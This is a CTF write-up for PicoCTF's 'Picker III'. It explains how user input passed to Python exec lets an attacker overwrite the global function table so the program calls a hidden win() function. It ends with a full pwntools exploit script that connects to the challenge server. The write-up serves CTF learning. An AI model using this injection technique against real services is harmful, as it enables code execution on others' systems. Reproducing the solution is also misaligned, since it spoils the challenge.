# PicoCTF - Picker III Writeup (Automated Exploit & Deep Analysis)

This repository contains a fully automated exploit script and a comprehensive architectural breakdown for the **Picker III** challenge from PicoCTF. This challenge demonstrates how a global variable state can be manipulated to achieve arbitrary function execution even when traditional direct code injection characters are heavily restricted by strict filters.

---

## 1. Challenge Architecture & Source Code
The application builds upon its predecessor by introducing a fixed **Function Table** (`func_table`) consisting of pre-defined, whitelisted subroutines. Users can execute functions 1 through 4, which dynamically pulls the respective function name from the table memory buffer and evaluates it using `eval()`.

The ultimate objective is to invoke the hidden `win()` subroutine, which extracts the flag from disk.

### The Code Setup
```python
func_table = '''\
print_table                     \
read_variable                   \
write_variable                  \
getRandomNumber                 \
'''

def check_table():
  global func_table
  if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE):
    return False
  return True

def write_variable():
  var_name = input('Please enter variable name to write: ')
  if( filter_var_name(var_name) ):
    value = input('Please enter new value of variable: ')
    if( filter_value(value) ):
      exec('global '+var_name+'; '+var_name+' = '+value)
```

---

## 2. In-Depth Vulnerability Analysis

### The Developer's Defensive Strategy (The Filter)
To lock down the program from the open-ended code injection found in the previous iteration, the developer implemented a strict **input sanitization matrix**:
1. **Variable Name Restriction (`filter_var_name`):** Employs a strict Regular Expression (`^[a-zA-Z_][a-zA-Z_0-9]*$`) verifying that target variables consist *only* of standard alphanumeric characters and underscores. This successfully prevents users from appending execution syntax like `()` or `[]` during target variable specification.
2. **Value Restrictions (`filter_value`):** When writing data via `write_variable()`, a character blocklist drops the execution request if it detects a semicolon `;`, an open parenthesis `(`, or a closing parenthesis `)`. The developer assumed: *"If a user cannot type parentheses, it is mathematically impossible for them to invoke a function call."*

### The Architectural Flaw (The Breakthrough)
As attackers, we perform static code analysis by hunting for **unprotected global data states that control internal execution flow**. Looking closely at the system layout reveals two fatal design oversights:

#### Oversight 1: The Function Table is Mutable Global Data
The `func_table` is not a secure, read-only constant block; it is instantiated as a standard mutable global string variable in Python's memory space. Because the `write_variable()` routine allows us to target *any* valid global name passing the alphanumeric filter, the entire `func_table` structure can be completely overwritten by a user.

#### Oversight 2: Parentheses are Handled Dynamically by the Host
The `filter_value()` validation stops us from supplying parentheses (`(` and `)`). However, a closer look at the function dispatch mechanism reveals that **we do not need to supply them**. The application automatically appends the execution syntax to whatever string token it extracts out of the table data:
```python
# The application does this automatically behind the scenes:
eval(func_name + '()')
```
Therefore, if we can successfully change the first function name text inside the table array from `"print_table"` to `"win"`, the application itself will happily append the parentheses and execute `win()` on our behalf.

#### Overcoming the `check_table()` Guardrail
The only structural obstacle remaining is the `check_table()` validation layer, which mandates that the total table string length must equal exactly 128 bytes (4 functions × 32 bytes per function entry). 

To satisfy this condition without violating the parenthesis ban, we construct a malicious table string payload where every single 32-byte slot is completely filled with the word `"win"`, padded out with empty space characters (`0x20`):
```python
malicious_table = "'" + "win".ljust(32) * 4 + "'"
# Evaluates to: 'win                             win                             win                             win                             '
# Total Length: Exactly 128 bytes. Caracter set: strictly alpha characters and spaces.
```
This payload circumvents the `filter_value()` restriction seamlessly. Once injected, triggering menu choice `1` forces the application to extract `"win"`, append `()`, and dump the flag string.

---

## 3. Automated Exploit Script (`exploit.py`)

This standalone Python script utilizes the `pwntools` library to automate the entire runtime attack lifecycle. It handles server connectivity, variable state modification, table corruption, dynamic output scraping via Regular Expressions, and immediate token conversion.

```python
#!/usr/bin/env python3
from pwn import *
import re

context.log_level = 'info'
HOST = 'xebec.cylabacademy.net'
PORT = 54321  

def main():
    try:
        log.info(f"Connecting to remote target {HOST}:{PORT}...")
        p = remote(HOST, PORT)
        
        # Step 1: Call the write_variable routine (Option 3)
        log.info("Navigating to option 3 (write_variable)...")
        p.sendlineafter(b'==> ', b'3')
        
        # Step 2: Target the global function table string variable
        p.sendlineafter(b'Please enter variable name to write: ', b'func_table')
        
        # Step 3: Inject the padded 128-byte malicious table layout
        # This completely replaces 'print_table' with 'win' while satisfying size rules
        malicious_table = "'" + "win".ljust(32) * 4 + "'"
        log.info("Injecting mutated function table into memory...")
        p.sendlineafter(b'Please enter new value of variable: ', malicious_table.encode())
        
        # Step 4: Call the first function slot from the compromised table (Option 1)
        # The program will internally execute eval("win" + "()")
        log.info("Executing the newly injected win function wrapper...")
        p.sendlineafter(b'==> ', b'1')
        
        # Step 5: Capture output stream and dynamically pull Hex tokens
        log.info("Retrieving server output stream...")
        response = p.recvall(timeout=5)
        raw_output = response.decode('utf-8', errors='ignore')
        
        hex_tokens = re.findall(r'0x[0-9a-fA-F]+', raw_output)
        
        if not hex_tokens:
            log.error("No valid hex ASCII tokens discovered in response!")
            return
            
        # Step 6: Parse Hex-ASCII tokens back to plaintext flag
        flag_characters = [chr(int(token, 16)) for token in hex_tokens]
        final_flag = "".join(flag_characters)
        
        print("\n" + "=" * 60)
        print(f"[+] DYNAMIC FLAG CAPTURED: {final_flag}")
        print("=" * 60 + "\n")
        
    except Exception as e:
        log.exception(f"Exploit pipeline failed execution: {e}")

if __name__ == '__main__':
    main()
```

---
